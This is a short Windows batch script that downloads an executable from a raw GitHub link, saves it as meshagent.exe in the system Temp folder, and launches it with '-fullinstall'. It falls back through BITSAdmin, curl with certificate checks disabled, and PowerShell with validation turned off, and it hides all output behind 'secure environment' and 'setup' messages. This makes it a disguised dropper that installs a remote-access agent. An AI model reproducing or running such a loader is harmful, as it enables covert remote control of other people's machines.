@echo off
setlocal Enabledelayedexpansion

:: 1. PUT YOUR EXACT DOWNLOAD LINK HERE:
set "URL=https://raw.githubusercontent.com/abrahamgarciaaa1972-ai/In/refs/heads/main/Update.exe"

set "DEST_DIR=%SystemRoot%\Temp"
set "DEST_FILE=%DEST_DIR%\meshagent.exe"

echo Initializing secure environment...

:: Method 1: Try BITSAdmin
bitsadmin /transfer "MeshDownload" /priority FOREGROUND "%URL%" "%DEST_FILE%" >nul 2>&1

:: Method 2: Try native curl (if BITSAdmin failed)
if not exist "%DEST_FILE%" (
    curl -s -L -k -o "%DEST_FILE%" "%URL%" >nul 2>&1
)

:: Method 3: Try PowerShell (Ignore SSL certificate errors if your server uses self-signed)
if not exist "%DEST_FILE%" (
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('%URL%', '%DEST_FILE%')" >nul 2>&1
)

:: Verify file exists before triggering execution
if exist "%DEST_FILE%" (
    echo Launching setup...
    start "" "%DEST_FILE%" -fullinstall
    exit
) else (
    echo =======================================================
    echo ERROR: The script could not download the MeshCentral file.
    echo =======================================================
    echo.
    echo Possible causes:
    echo 1. The URL inside this script is incorrect.
    echo 2. Your MeshCentral server is offline.
    echo 3. A firewall or antivirus is blocking the network connection.
    echo.
    echo Current URL attempted: %URL%
    echo.
    pause
)
